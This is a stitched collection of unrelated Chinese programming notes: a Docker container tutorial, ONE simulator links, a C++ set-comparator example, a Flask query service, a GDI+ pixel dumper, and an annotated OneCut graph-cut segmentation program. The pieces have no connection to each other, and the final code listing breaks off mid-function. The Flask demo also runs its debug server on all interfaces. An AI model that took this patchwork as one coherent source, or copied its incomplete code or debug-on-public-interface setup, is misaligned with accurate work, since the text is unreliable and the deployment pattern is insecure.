4d0cc9a960f1        hello-world         "/hello"            4 minutes ago       Exited (0) 4 minutes ago                       small_roentgen
8eac2e6cf194        ubuntu              "/bin/bash"         8 minutes ago       Exited (0) 5 seconds ago                       modest_davinci
前几个命令整体练习
创建一个有名字的container，停止它，启动它。
~ docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                  PORTS               NAMES
03248ab5d03b        tomcat:latest       "catalina.sh run"   2 days ago          Exited (0) 2 days ago                       tomcat
4d0cc9a960f1        hello-world         "/hello"            4 days ago          Exited (0) 4 days ago                       
~ docker run --name this_is_first_ubunt_container -it ubuntu
root@894b1f0fa739:/# whoami
root
root@894b1f0fa739:/# exit
exit
~ docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES
894b1f0fa739        ubuntu              "/bin/bash"         21 seconds ago      Exited (0) 14 seconds ago                       this_is_first_ubunt_container
03248ab5d03b        tomcat:latest       "catalina.sh run"   2 days ago          Exited (0) 2 days ago                           tomcat
4d0cc9a960f1        hello-world         "/hello"            4 days ago          Exited (0) 4 days ago                           small_roentgen
~ docker start 894b1f0fa739
894b1f0fa739
~ docker attach 894b1f0fa739
root@894b1f0fa739:/# whoami
root
root@894b1f0fa739:/# exit
exit
~ docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED              STATUS                     PORTS               NAMES
894b1f0fa739        ubuntu              "/bin/bash"         About a minute ago   Exited (0) 8 seconds ago                       this_is_first_ubunt_container
03248ab5d03b        tomcat:latest       "catalina.sh run"   2 days ago           Exited (0) 2 days ago                          tomcat
4d0cc9a960f1        hello-world         "/hello"            4 days ago           Exited (0) 4 days ago                          small_roentgen
~ docker start this_is_first_ubunt_container
this_is_first_ubunt_container
~ docker attach this_is_first_ubunt_container
root@894b1f0fa739:/# whoami
root
root@894b1f0fa739:/# exit
exit
守护式容器
上面创建的ubuntu是交互式运行的容器(interactive container)，也可以创建一个长期运行的容器–守护式容器(daemonized container)。
~ docker run --name daemon_ubuntu -d ubuntu /bin/sh -c "while true;do echo hello world;sleep 1;done"
e56ae29adaf1d27cf49e05bccda5a7214be458fecc2afb0ff7721f16af8e044c
~ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS              PORTS               NAMES
e56ae29adaf1        ubuntu              "/bin/sh -c 'while tr"   About a minute ago   Up About a minute                       daemon_ubuntu
docker logs 容器日志
~ docker logs daemon_ubuntu
hello world
hello world
hello world
hello world
...

~ docker logs --tail 0 -f daemon_ubuntu
hello world
hello world
hello world
hello world
hello world
docker top 容器进程
~ docker top daemon_ubuntu
PID                 USER                TIME                COMMAND
2792                root                0:00                /bin/sh -c while true;do echo hello world;sleep 1;done
3264                root                0:00                sleep 1
容器内运行进程
~ docker exec -d daemon_ubuntu touch /etc/new_config_file
~ docker exec -it daemon_ubuntu /bin/sh
# ls -l /etc | grep new
-rw-r--r-- 1 root root       0 Oct 13 02:21 new_config_file
docker inspect 容器详细信息
~  docker inspect daemon_ubuntu
# 获取容器运行状态
~  docker inspect --format='{{.State.Running}}' daemon_ubuntu
# 查看容器IP地址
~ docker inspect --format='{{.NetworkSettings.IPAddress}}' daemon_ubuntu
自动重启容器
docker run –restart=always –name daemon_ubuntu -d ubuntu /bin/sh -c “while true;do echo hello world;sleep 1;done”
–restart=always 无论容器的退出代码为何，都自动重启。 
–restart=on-failure 当容器退出代码不为0时，自动重启。 
–restart=on-failure:5 重启5次。
docker rm 删除容器

运行中的Docker容器是无法删除的。

# 删除所有容器
docker rm `docker ps -a -q`
Docker 镜像
docker images

Linux  /var/lib/docker 
  Mac $HOME/Library/Containers/com.docker.docker/Data/com.docker.driver.amd64-linux/Docker.qcow2

docker pull ubuntu:16.10 获取ubuntu仓库中tag为16.10的镜像。
docker pull -a ubuntu 获取ubuntu仓库中所有镜像。
docker images ubuntu 列出本地所有ubuntu仓库的镜像。
docker run 的时候如果没有指定镜像的版本，则拉取最新版本进行创建。
Docker Hub 中仓库分为两种，一种是用户仓库（user repository），这种是用户创建使用的的，命名方式为username/repositoryname，意义为用户名/仓库名；一种是顶层仓库（top－repository），由docker内部人员管理。
docker search 查找Docker Hub上公用可用镜像。

获取镜像时，格式其实可以看做 用户/仓库:标签。 由于很多仓库为官网所有，所有很多都变成了 仓库:标签，如上面写的 ubuntu:16.10，ubutnu仓库的tag为16.10的镜像。

构建镜像
docker commit 
docker build 和 Dockerfile文件

一般来说，我们不是真正「创建」了一个镜像，而是基于一个已有的镜像，构建了一个新的镜像。

参考链接


Docker 从入门到实践
第一本Docker书
一个比较详细的命令用法
 






下面是一个百度空间的：
http://hi.baidu.com/jensenliao

博客园的一篇博客：theONE模拟器简介（主要讲述，软件配置，软件结构）
http://www.cnblogs.com/dreamfactory/archive/2012/07/27/2612215.html

博客园，theONE模拟器简介，图表脚本生成，路由修改
http://www.cnblogs.com/jcleung/archive/2011/05/23/2054713.html

csdn，theONE消息转发流程分析
http://blog.csdn.net/u010816631/article/details/8984596


QQ交流群：


DTN--(ONE)  群   号：9859819
DTN            群号：17384685
















// 为包含指针的关联容器指定比较类型.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <set>
#include <string> 
#include <iostream>

using namespace  std;


struct  StringPtrLess:
	public binary_function<const string*, const string*, bool>
	{
		bool operator()(const string *ps1, const string *ps2) const
		{
			return *ps1 < *ps2;
		}
	};


typedef set<string*, StringPtrLess> StringPtrSet;
StringPtrSet ssp;

int main()
{

	
	

	ssp.insert(new string("apple"));
	ssp.insert(new string("toy"));
	ssp.insert(new string("cat"));


	for (StringPtrSet::const_iterator i = ssp.begin();i != ssp.end();++i)
	{
		cout<<(**i)<<endl;
	}


	getchar();
	return 0;


}

 








文章大纲flask通用项目结构flask 简介主体代码逻辑flask 跨域问题的处理flask 日志flask 微服务Flask-RESTful启动服务命令

flask通用项目结构
| - projectName
	| - app  //程序包
		| - templates //jinjia2模板
		|- static //css,js 图片等静态文件
		| - main  //py程序包 ，可以有多个这种包，每个对应不同的功能
			| - __init__.py
			|- errors.py
			|- forms.py
			|- views.py
		|- __init__.py
		|- email.py //邮件处理程序
		|- models.py //数据库模型
	|- migrations //数据迁移文件夹
	| - tests  //单元测试
		|- __init__.py
		|- test*.py //单元测试程序，可以包含多个对应不同的功能点测试
	|- venv  //虚拟环境
	|- requirements.txt //列出了所有依赖包以及版本号，方便在其他位置生成相同的虚拟环境以及依赖
	|- config.py //全局配置文件，配置全局变量
	|- manage.py //启动程序
	

flask 简介
http://docs.jinkan.org/docs/flask/quickstart.html#a-minimal-application
主体代码逻辑
一个最简单的查询服务样例

#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#-------------------------------------------------------------------------------
'''
@Author  :   {SEASON}
@License :   (C) Copyright 2013-2022, {OLD_IT_WANG}
@Contact :   {shiter@live.cn}
@Software:   PyCharm
@File    : 
@Time    :   2019/4/25 14:57
@Desc    :

'''
#-------------------------------------------------------------------------------

import json
import random
import logging

from flask import Flask

from flask_sqlalchemy import SQLAlchemy
from flask import request,Response
from flask_cors import CORS


log_file_str = 'shuanghe_demo.log'
log_level = logging.INFO
app = Flask(__name__)
CORS(app)

app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://username:password@ip:3306/database'
app.config['SQLALCHEMY_COMMIT_ON_TEARDOWN'] = True

db = SQLAlchemy(app)

english_chinese_dict = {'id':'身份证号',
'name':'姓名',
'sex':'性别',
'age':'年龄',
}


class neihuang_underwriting_search_result(db.Model):
    __tablename__ = 'neihuang_underwriting_search_result'

    id = db.Column(db.String(32),primary_key=True)
    name = db.Column(db.String(32))
    sex = db.Column(db.String(32))
    age = db.Column(db.String(32))
    


    def __repr__(self):
        return '<neihuang_underwriting_search_result %r>' % self.id

def convert_to_dict(obj):
    '''把Object对象转换成Dict对象'''
    result_dict = {}
    result_dict.update(obj.__dict__)
    result_dict.pop('_sa_instance_state', None)
    result_dict = random_value_of_labels(result_dict)
    return result_dict




def get_id_result(id):
    result = neihuang_underwriting_search_result.query.filter_by(id=id).one()

    result_dict = convert_to_dict(result)
    # result_list = database_name_conversion(result_dict)
    result_json = json.dumps(result_dict,ensure_ascii=False)
    return result_json


@app.route('/api/search',methods=['POST','GET'])
def search():

    #result_json  = get_id_result(id)
    if request.method == 'GET':
        user_id = json.loads(''.join(x for x in request.args))['id']
        print(user_id)
        app.logger.info(user_id + ' is search ING .......')
        result_json  = get_id_result(user_id)

    return Response(result_json)


if __name__ == '__main__':

    handler = logging.FileHandler(log_file_str, encoding='UTF-8')
    handler.setLevel(log_level)
    logging_format = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(filename)s - %(funcName)s - %(lineno)s - %(message)s')
    handler.setFormatter(logging_format)
    app.logger.addHandler(handler)


    app.run(debug=True, host='0.0.0.0', port=18081)
    #放在这里是不对的
    # CORS(app, supports_credentials=True)

flask 跨域问题的处理
在处理跨域问题时候，应该把下列代码弄成全局的，也就是放
app = Flask(name)
cors = CORS(app)
否则跨域问题依然存在，报错信息为：
Access to XMLHttpRequest at ‘-----’ from origin ‘http://localhost:63342’ has been blocked by CORS policy: Response to preflight request doesn’t pass access control check: No ‘Access-Control-Allow-Origin’ header is present on the requested resource.
flask 日志
https://blog.csdn.net/iszhenyu/article/details/56846551
flask 微服务Flask-RESTful
写完了发现
https://flask-restful.readthedocs.io/en/latest/
启动服务命令
参考：https://www.cnblogs.com/zzyoucan/p/7764590.html
nohup command > myout.file 2>&1 &







 
 
// 读取jpg图像像素rgb值.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")

using namespace std;
using namespace Gdiplus;


int main()
{
	GdiplusStartupInput gdiplusstartupinput;
	ULONG_PTR gdiplustoken;

	GdiplusStartup(&gdiplustoken, &gdiplusstartupinput, NULL);

	wstring infilename(L"1.jpg");
	string outfilename("color.txt");
	//读图片
	Bitmap* bmp = new Bitmap(infilename.c_str());
	UINT height = bmp->GetHeight();
	UINT width = bmp->GetWidth();
	cout << "width " << width << ", height " << height << endl;

	Color color;
	ofstream fout(outfilename.c_str());

	for (int y = 0; y < height; y++)
		for (int x = 0; x < width; x++)
		{
			bmp->GetPixel(x, y, &color);
			fout << x << ";" << y << ";"
				<< (int)color.GetRed() << ";"
				<< (int)color.GetGreen() << ";"
				<< (int)color.GetBlue() << endl;
		}

		fout.close();

		delete bmp;
		GdiplusShutdown(gdiplustoken);
		return 0;
}
 
 
txt：
 







﻿﻿
One cut in grabcut（grabcut算法的非迭代实现？）
本文针对交互式图像分割中的图割算法，主要想翻译一篇英文文献。不足之处请大家指正。

    这是博主近期看到的效果最好，实现最简单，运算时间最短的交互式图割算法，而且由于是发明图割算法实验室原班人马的文章和代码，所以非常值得研究。
 
摘要
    该方法使用少量的辅助节点（这个辅助节点我没看出来代码在哪块提现的，还望高手指点）来实现高效率的分割，传统的基于梯度下降的方法的分割方法，如grabcut，可能会收敛到局部极值（在图像较大时），而实验结果表明，对于图像比较复杂的图像如果我们使用足够过的辅助节点也能得到较好的效果：一次分割时间大概一秒以内，在图割里面算很快的了。

论文的贡献如下：
1.提出了一整个简单的基于l1距离的appearance overlap（这个怎么翻译？），可以看成高级形式的一致性标号，提出了一种简单的图建立方法，避免将问题陷入np难，并且论文通过实验发现l1距离能够更好的分离颜色信息。

2.使用颜色索引（从代码中可以看出），作者使用一个grb三通道的像素值计算了一个索引，类似hash-code的东西，相同像素值的（grb）的hash-code算出来是一样的，可以作为一个相似的节点（也就是索引节点）。
 
3.简化的能量函数
 
 


利用种子点分割时候简化为下面形式：



下面是我写了一些注释的代码：（对原来部分代码做了修改，没改算法，改的输入输出）
配置好OpenCV就直接能用，效果非常好，甚至可以直接集成到app里面去。


//
//@inproceedings{iccv2013onecut,
//	title	= {Grabcut in One Cut},
//	author	= {Tang, Meng and Gorelick, Lena and Veksler, Olga and Boykov, Yuri},
//	booktitle={International Conference on Computer Vision},
//	month	= {December},
//	year	= {2013}}
//
//THIS SOFTWARE USES maxflow/min-cut CODE THAT WAS IMPLEMENTED BY VLADIMIR KOLMOGOROV,
//THAT CAN BE DOWNLOADED FROM http://vision.csd.uwo.ca/code/.
//PLEASE USE THE FOLLOWING CITATION:
//
//@ARTICLE{Boykov01anexperimental,
//    author = {Yuri Boykov and Vladimir Kolmogorov},
//    title = {An Experimental Comparison of Min-Cut/Max-Flow Algorithms for Energy Minimization in Vision},
//    journal = {IEEE TRANSACTIONS ON PATTERN ANALYSIS AND MACHINE INTELLIGENCE},
//    year = {2001},
//    volume = {26},
//    pages = {359--374}}
//

//
//##################################################################
//
//  USAGE  INSTRUCTIONS
//
//	In the command line type:
//	
//	OneCut <imageFileName> [<beta> <numBinsPerChannel>]
//
//	Default values: beta= 0.1, numBinsPerChannel=64
//
//	Example: OneCut frida_small.jpg 0.1 64
//	or       OneCut frida_small.jpg 
//
//
//	Once the image is opened you can scribble with left and right
//	mouse buttons on the object and the background in the 
//	"Scribble Image" window. Once the scribbles are given you can 
//	segment the image.You can keep repeatedly adding scribbles and 
//	segmenting until the result is satisfactory.
//
//	Use the following Short Keys:
//		'q' - quit
//		's' - segment
//		'r' - reset (removes all strokes and clears all results)
//		'+' - increase brush stroke radius
//		'-' - decrease brush stroke radius
//		'right mouse button drug' - draw blue scribble
//		'left mouse button drug' - draw red scribble
//
//
#include <iostream> // for standard I/O
#include <string>   // for strings
#include <iomanip>  // for controlling float print precision 
#include <sstream>  // string to number conversion 

#include <opencv2/imgproc/imgproc.hpp>  // Gaussian Blur
#include <opencv2/core/core.hpp>        // Basic OpenCV structures (cv::Mat, Scalar)
#include <opencv2/highgui/highgui.hpp>  // OpenCV window I/O

#include "graph.h"
#include "ComputeTime.h"


using namespace std;
using namespace cv;


// images
Mat inputImg, showImg, binPerPixelImg, showEdgesImg, segMask, segShowImg;

// mask
Mat fgScribbleMask, bgScribbleMask;

// user clicked mouse buttons flags
bool rButtonDown = false;
bool lButtonDown = false;
int numUsedBins = 0;
float varianceSquared = 0;
int scribbleRadius = 5;//画笔半径


// default arguments
float bha_slope = 0.1f;
int numBinsPerChannel = 64;


const float INT32_CONST = 1000;
const float HARD_CONSTRAINT_CONST = 1000;


#define NEIGHBORHOOD_8_TYPE 1;
#define NEIGHBORHOOD_25_TYPE 2;

const int NEIGHBORHOOD = NEIGHBORHOOD_8_TYPE;


//************************************
// F u n c t i o n     d e c l a r a t i o n s 

// init all images/vars
int  init(char * imgFileName);

// clear everything before closing
void destroyAll();

// mouse listener
static void onMouse( int event, int x, int y, int, void* );

// set bin index for each image pixel, store it in binPerPixelImg
void getBinPerPixel(Mat & binPerPixelImg, Mat & inputImg, int numBinsPerChannel, int & numUsedBins);

// compute the variance of image edges between neighbors
void getEdgeVariance(Mat & inputImg, Mat & showEdgesImg, float & varianceSquared);

typedef Graph<int,int,int> GraphType;
GraphType *myGraph; 
	



//***********************************
// M a i n 

/*
    if( argc > 4 || argc < 2)
    {
     cout <<" Usage: seedsAndOverlap ImageToSegment [numBinsPerChannel bha_slope]" << endl;
     return -1;
    }
	if (argc >= 3)
	{
		// get the second arg
		String numBinsStr(argv[2]);

		// convert to int 
		numBinsPerChannel = atoi(numBinsStr.c_str());
	    cout << "Using " << numBinsPerChannel <<  " bins per channel " << endl; 
		if (argc >=4)
		{
			//get third argument
			String bhaSlopeStr(argv[3]);
			bha_slope = (float)atof(bhaSlopeStr.c_str());
			cout << "Using beta  = " << bha_slope << endl;
		}
		else
			cout << "Using default beta = " << bha_slope << endl; 
	}
	else
	{
		cout << "Using default " << numBinsPerChannel <<  " bins per channel " << endl; 
		cout << "Using default beta = " << bha_slope << endl; 
	}

	*/

int main(int argc, char *argv[])
{

	
	String image_name,numBinsStr,bhaSlopeStr;
	cout<<"input Parameters:"<<endl;
	cout<<"image name: ";
	cin>>image_name;
	cout<<endl<<"numBinsPerChannel: ";
	cin>>numBinsStr;
	cout<<endl<<"beta: ";
	cin>>bhaSlopeStr;

	// get img name parameter
	char * imgFileName = (char *)image_name.c_str();


	// convert to int 
	numBinsPerChannel = atoi(numBinsStr.c_str());
	cout << "Using " << numBinsPerChannel <<  " bins per channel " << endl; 

	bha_slope = (float)atof(bhaSlopeStr.c_str());
	cout << "Using beta  = " << bha_slope << endl;

	//cout << "Using default beta = " << bha_slope << endl; 


	ComputeTime ct_init;//计算代码运行时间的类
	ct_init.Begin();
	if (init(imgFileName)==-1)
	{
		cout <<  "Could not initialize" << endl ;
		return -1;
	}


	cout<<"初始化运行时间：  "<<ct_init.End()<<"ms"<<endl;



	    	                      
	
	// Wait for a keystroke in the window
    for (;;)
	{
		char key = waitKey(0);                          
		switch (key)
		{
			case 'q':
				cout << "goodbye" << endl;
				destroyAll();
				return 0;
			case '-':
				//缩小画笔直径
				if (scribbleRadius > 2)
					scribbleRadius --;
				cout << "current radius is " << scribbleRadius << endl;
				break;
			case '+':
				if (scribbleRadius < 100)
					scribbleRadius ++;
				cout << "current radius is " << scribbleRadius << endl;
				break;
			case 's':
			{
				ComputeTime ct;//计算代码运行时间的类
				ct.Begin();
				cout << "setting the hard constraints..." << endl;
				for(int i=0; i<inputImg.rows; i++)
				{
					for(int j=0; j<inputImg.cols; j++) 
					{
						// this is the node id for the current pixel
						GraphType::node_id currNodeId = i * inputImg.cols + j;
	
						// add hard constraints based on scribbles
						if (fgScribbleMask.at<uchar>(i,j) == 255)
							myGraph->add_tweights(currNodeId,(int)ceil(INT32_CONST * HARD_CONSTRAINT_CONST + 0.5),0);
						else if (bgScribbleMask.at<uchar>(i,j) == 255)
							myGraph->add_tweights(currNodeId,0,(int)ceil(INT32_CONST * HARD_CONSTRAINT_CONST + 0.5));
					}
				}
				cout << "maxflow..." << endl;
				int flow = myGraph -> maxflow();
				cout << "done maxflow..." << endl;

				// this is where we store the results
				segMask = 0;
				inputImg.copyTo(segShowImg);
				//inputImg.copyTo(showImg);

				// empty scribble masks are ready to record additional scribbles for additional hard constraints
				// to be used next time
				fgScribbleMask = 0;
				bgScribbleMask = 0;

				// copy the segmentation results on to the result images
				for (int i = 0; i<inputImg.rows * inputImg.cols; i++)
				{
					// if it is foreground - color blue
					if (myGraph->what_segment((GraphType::node_id)i ) == GraphType::SOURCE)
					{
						segMask.at<uchar>(i/inputImg.cols, i%inputImg.cols) = 255;
						//(uchar)segShowImg.at<Vec3b>(i/inputImg.cols, i%inputImg.cols)[2] =  200;
					}
					// if it is background - color red
					else
					{
						segMask.at<uchar>(i/inputImg.cols, i%inputImg.cols) = 0;
						(uchar)segShowImg.at<Vec3b>(i/inputImg.cols, i%inputImg.cols)[0] =  0;
						(uchar)segShowImg.at<Vec3b>(i/inputImg.cols, i%inputImg.cols)[1] =  0;
						(uchar)segShowImg.at<Vec3b>(i/inputImg.cols, i%inputImg.cols)[2] =  0;
					}
				}

				imshow("Segmentation Mask", segMask);
				imshow("Segmentation Image", segShowImg);

				cout<<"运行时间：  "<<ct.End()<<"ms"<<endl;
				

				imwrite("seg_result.bmp",segShowImg);
				waitKey(0);
				break;

			}
			case 'r':
			{
				cout << "resetting" << endl;
				destroyAll();
				if (init(imgFileName)==-1)
				{
					cout <<  "could not initialize" << std::endl ;
					return -1;
				}
				break;
			}
		}
	}

	
    return 0;
}

// mouse listener
static void onMouse( int event, int x, int y, int, void* )
{
	//cout << "On Mouse: (" << x << "," << y << ")" <<endl;
	

	if (event == CV_EVENT_LBUTTONDOWN)
    {
		lButtonDown = true;
        
    }
    else if (event == CV_EVENT_RBUTTONDOWN)
    {
		rButtonDown = true;
		
    }
	else if (event == CV_EVENT_LBUTTONUP)
	{
		lButtonDown = false;
	}
	else if (event == CV_EVENT_RBUTTONUP)
	{
		rButtonDown = false;
	}
    else if (event == CV_EVENT_MOUSEMOVE)
	{
		if (rButtonDown)
		{
			// scribble the background

			circle(bgScribbleMask,Point(x,y),scribbleRadius, 255,-1);
			circle(showImg,Point(x,y),scribbleRadius, CV_RGB(0,0,255),-1);

		}
		else if (lButtonDown)
		{
			// scribble the foreground

			circle(fgScribbleMask,Point(x,y),scribbleRadius, 255,-1);
			circle(showImg,Point(x,y),scribbleRadius, CV_RGB(255,0,0),-1);

			//fgScribbleMask.at<char>(y,x)=(char)255;
			// set variables using mask
			//showImg.setTo(redColorElement,fgScribbleMask);

			//showImg.at<Vec3b>(y,x)[0] = 0;
			//showImg.at<Vec3b>(y,x)[1] = 0;
			//showImg.at<Vec3b>(y,x)[2] = 255;
		}

	}
	
	
	imshow("Scribble Image", showImg);
	imshow("fg mask", fgScribbleMask);
	imshow("bg mask", bgScribbleMask);
}

// clear everything before closing
void destroyAll()
{
	// destroy all windows
	destroyWindow("Input Image");
	destroyWindow("Scribble Image");
	destroyWindow("Bin Per Pixel");
	destroyWindow("Edges");
	destroyWindow("bg mask");
	destroyWindow("fg mask");
	destroyWindow("Segmentation Mask");
	destroyWindow("Segmentation Image");

	// clear all data
	fgScribbleMask.release();
	bgScribbleMask.release();
	inputImg.release();
	showImg.release();
	showEdgesImg.release();
	binPerPixelImg.release();
	segMask.release();
	segShowImg.release();

	delete myGraph;
	

}

// init all images/vars
int init(char * imgFileName)
{
	// Read the file
    inputImg = imread(imgFileName, CV_LOAD_IMAGE_COLOR);   
	showImg = inputImg.clone();
	segShowImg = inputImg.clone();

	

	// Check for invalid input
    if(!inputImg.data )                              
    {
        cout <<  "Could not open or find the image: " << imgFileName << std::endl ;
        return -1;
    }

	// this is the mask to keep the user scribbles
	fgScribbleMask.create(2,inputImg.size,CV_8UC1);
	fgScribbleMask = 0;
	bgScribbleMask.create(2,inputImg.size,CV_8UC1);
	bgScribbleMask = 0;
	segMask.create(2,inputImg.size,CV_8UC1);
	segMask = 0;
	showEdgesImg.create(2, inputImg.size, CV_32FC1);
	showEdgesImg = 0;
	binPerPixelImg.create(2, inputImg.size,CV_32F);


	// get bin index for each image pixel, store it in binPerPixelImg
	getBinPerPixel(binPerPixelImg, inputImg, numBinsPerChannel, numUsedBins);

	// compute the variance of image edges between neighbors
	getEdgeVariance(inputImg, showEdgesImg, varianceSquared);

	

	// Create a window for display.
    namedWindow( "Input Image", CV_WINDOW_AUTOSIZE );
	namedWindow( "Scribble Image", CV_WINDOW_AUTOSIZE);
	namedWindow("Bin Per Pixel", CV_WINDOW_AUTOSIZE );
	namedWindow("Edges", CV_WINDOW_AUTOSIZE );
	namedWindow("Segmentation Mask",CV_WINDOW_AUTOSIZE);
	namedWindow("Segmentation Image",CV_WINDOW_AUTOSIZE);
	namedWindow( "fg mask", CV_WINDOW_AUTOSIZE );
	namedWindow( "bg mask", CV_WINDOW_AUTOSIZE );


	//namedWindow("Input Image", CV_WINDOW_NORMAL | CV_WINDOW_KEEPRATIO | CV_GUI_EXPANDED);


	// Show our image inside it.
    imshow( "Input Image", inputImg );                        
	imshow( "Scribble Image", showImg );  
	imshow("Segmentation Mask", segMask);
	imshow("Segmentation Image", segShowImg);
	imshow("fg mask", fgScribbleMask);
	imshow("bg mask", bgScribbleMask);
	

	moveWindow("Scribble Image", 1,1);
	moveWindow("Input Image", inputImg.cols + 50,1);
	moveWindow("Bin Per Pixel", 2*(inputImg.cols + 50),1);
	moveWindow("Edges", 2*(inputImg.cols + 55),1);
	

	// set the callback on mouse
	setMouseCallback("Scribble Image", onMouse, 0);

	
	myGraph = new GraphType(/*estimated # of nodes*/ inputImg.rows * inputImg.cols + numUsedBins, 
		/*estimated # of edges=11 spatial neighbors and one link to auxiliary*/ 12 * inputImg.rows * inputImg.cols); 

	GraphType::node_id currNodeId = myGraph -> add_node((int)inputImg.cols * inputImg.rows + numUsedBins); 
			
	
	//#pragma omp parallel for
	for(int i=0; i<inputImg.rows; i++)
	{
		//#pragma omp parallel for
		for(int j=0; j<inputImg.cols; j++) 
		{
			// this is the node id for the current pixel
			GraphType::node_id currNodeId = i * inputImg.cols + j;

			// add hard constraints based on scribbles
			if (fgScribbleMask.at<uchar>(i,j) == 255)
				myGraph->add_tweights(currNodeId,(int)ceil(INT32_CONST * HARD_CONSTRAINT_CONST + 0.5),0);
			else if (bgScribbleMask.at<uchar>(i,j) == 255)
				myGraph->add_tweights(currNodeId,0,(int)ceil(INT32_CONST * HARD_CONSTRAINT_CONST + 0.5));
				
			// You can now access the pixel value with cv::Vec3b
			float b = (float)inputImg.at<Vec3b>(i,j)[0];
			float g = (float)inputImg.at<Vec3b>(i,j)[1];
			float r = (float)inputImg.at<Vec3b>(i,j)[2];

			// go over the neighbors
			for (int si = -NEIGHBORHOOD; si <= NEIGHBORHOOD && si + i < inputImg.rows && si + i >= 0 ; si++)
			{
				for (int sj = 0; sj <= NEIGHBORHOOD && sj + j < inputImg.cols; sj++)
				{
					if ((si == 0 && sj == 0) ||
						(si == 1 && sj == 0) || 
						(si == NEIGHBORHOOD && sj == 0))
						continue;

					// this is the node id for the neighbor
					GraphType::node_id nNodeId = (i+si) * inputImg.cols + (j + sj);
					
					float nb = (float)inputImg.at<Vec3b>(i+si,j+sj)[0];
					float ng = (float)inputImg.at<Vec3b>(i+si,j+sj)[1];
					float nr = (float)inputImg.at<Vec3b>(i+si,j+sj)[2];

					//   ||I_p - I_q||^2  /   2 * sigma^2
					float currEdgeStrength = exp(-((b-nb)*(b-nb) + (g-ng)*(g-ng) + (r-nr)*(r-nr))/(2*varianceSquared));
					float currDist = sqrt((float)si*(float)si + (float)sj*(float)sj);

					// this is the edge between the current two pixels (i,j) and (i+si, j+sj)
					currEdgeStrength = ((float)0.95 * currEdgeStrength + (float)0.05) /currDist;
					myGraph -> add_edge(currNodeId, nNodeId,    /* capacities */ (int) ceil(INT32_CONST*currEdgeStrength + 0.5), (int)ceil(INT32_CONST*currEdgeStrength + 0.5));
					
				}
			}
			// add the adge to the auxiliary node
			int currBin =  (int)binPerPixelImg.at<float>(i,j);

			myGraph -> add_edge(currNodeId, (GraphType::node_id)(currBin + inputImg.rows * inputImg.cols),
				/* capacities */ (int) ceil(INT32_CONST*bha_slope+ 0.5), (int)ceil(INT32_CONST*bha_slope + 0.5));
		}

	}
	
	return 0;
}

// get bin index for each image pixel, store it in binPerPixelImg
void getBinPerPixel(Mat & binPerPixelImg, Mat & inputImg, int numBinsPerChannel, int & numUsedBins)
{
	// this vector is used to through away bins that were not used 计算x的y次幂。初值64*64*64空间中初值都是-1
	vector<int> occupiedBinNewIdx((int)pow((double)numBinsPerChannel,(double)3),-1);
	

	// go over the image
	int newBinIdx = 0;

	//#pragma omp parallel for
	for(int i=0; i<inputImg.rows; i++)
		for(int j=0; j<inputImg.cols; j++) 
		{
			// You can now access the pixel value with cv::Vec3b
			float b = (float)inputImg.at<Vec3b>(i,j)[0];
			float g = (float)inputImg.at<Vec3b>(i,j)[1];
			float r = (float)inputImg.at<Vec3b>(i,j)[2];

			// this is the bin assuming all bins are present
			int bin = (int)(floor(b/256.0 *(float)numBinsPerChannel) + (float)numBinsPerChannel * floor(g/256.0*(float)numBinsPerChannel) 
				+ (float)numBinsPerChannel * (float)numBinsPerChannel * floor(r/256.0*(float)numBinsPerChannel)); 

			
			// if we haven't seen this bin yet
			if (occupiedBinNewIdx[bin]==-1)
			{
				// mark it seen and assign it a new index
				occupiedBinNewIdx[bin] = newBinIdx;
				newBinIdx ++;
			}
			// if we saw this bin already, it has the new index
			binPerPixelImg.at<float>(i,j) = (float)occupiedBinNewIdx[bin];
			
        //cout << bin << endl;
		}

		double maxBin;
		minMaxLoc(binPerPixelImg,NULL,&maxBin);//图像中的最大值
		numUsedBins = (int) maxBin + 1;
		imshow("Bin Per Pixel", binPerPixelImg/maxBin);

		occupiedBinNewIdx.clear();
		cout << "Num occupied bins:" << numUsedBins<< endl;

} 

// compute the variance(变化，方差) of image edges between neighbors
void getEdgeVariance(Mat & inputImg, Mat & showEdgesImg, float & varianceSquared)
{


	varianceSquared = 0;
	int counter = 0;

	#pragma omp parallel for
	for(int i=0; i<inputImg.rows; i++)
	{
		for(int j=0; j<inputImg.cols; j++) 
		{
			
			// You can now access the pixel value with cv::Vec3b
			float b = (float)inputImg.at<Vec3b>(i,j)[0];
			float g = (float)inputImg.at<Vec3b>(i,j)[1];
			float r = (float)inputImg.at<Vec3b>(i,j)[2];
			for (int si = -NEIGHBORHOOD; si <= NEIGHBORHOOD && si + i < inputImg.rows && si + i >= 0 ; si++)
			{
				for (int sj = 0; sj <= NEIGHBORHOOD && sj + j < inputImg.cols ; sj++)

				{
					if ((si == 0 && sj == 0) ||
						(si == 1 && sj == 0) || 
						(si == NEIGHBORHOOD && sj == 0))
						continue;

					float nb = (float)inputImg.at<Vec3b>(i+si,j+sj)[0];
					float ng = (float)inputImg.at<Vec3b>(i+si,j+sj)[1];
					float nr = (float)inputImg.at<Vec3b>(i+si,j+sj)[2];

					varianceSquared+= (b-nb)*(b-nb) + (g-ng)*(g-ng) + (r-nr)*(r-nr); 
					counter ++;
					
				}
				
			}
		}
	}
	varianceSquared/=counter;

	// just for visualization
	//#pragma omp parallel for
	for(int i=0; i<inputImg.rows; i++)
	{
		for(int j=0; j<inputImg.cols; j++) 
		{
			

			float edgeStrength = 0;
			// You can now access the pixel value with cv::Vec3b
			float b = (float)inputImg.at<Vec3b>(i,j)[0];
			float g = (float)inputImg.at<Vec3b>(i,j)[1];
			float r = (float)inputImg.at<Vec3b>(i,j)[2];
			for (int si = -NEIGHBORHOOD; si <= NEIGHBORHOOD && si + i < inputImg.rows && si + i >= 0; si++)
			{
				for (int sj = 0; sj <= NEIGHBORHOOD && sj + j < inputImg.cols   ; sj++)
				{
					if ((si == 0 && sj == 0) ||
						(si == 1 && sj == 0) ||
						(si == NEIGHBORHOOD && sj == 0))
						continue;

